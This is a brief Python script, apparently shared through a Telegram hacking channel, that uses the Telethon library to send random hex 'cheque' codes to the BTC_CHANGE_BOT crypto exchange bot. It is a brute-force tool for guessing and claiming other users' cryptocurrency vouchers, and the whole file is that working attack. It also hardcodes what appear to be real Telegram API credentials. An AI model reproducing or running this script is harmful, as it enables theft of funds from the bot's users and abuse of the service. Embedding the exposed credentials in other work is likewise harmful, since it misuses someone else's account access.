from telethon import TelegramClient, events, sync
import random, time

print("Created by Ugnikinn (t.me/ugnikinn) for Hackers Academy (t.me/academyofhackers)")
print("Допилино @andreishal(https://github.com/AndreiShalupaey)\n")

api_id = '1952981'
api_hash = '5a0006a11053b5150d8e0995b49213a8'

client = TelegramClient('session', api_id, api_hash)

client.start()

count = int(input("Сколько чеков надо?\n– "))
print("Окей, жди.\n")

chars = "0123456789abcdef"
check = ""
for x in range(count):
    check = ""
    for i in range(1, 30):
        check = check + random.choice(chars)
    client.send_message('BTC_CHANGE_BOT', '/start c_' + check)
    print(x, check)
    time.sleep(1)
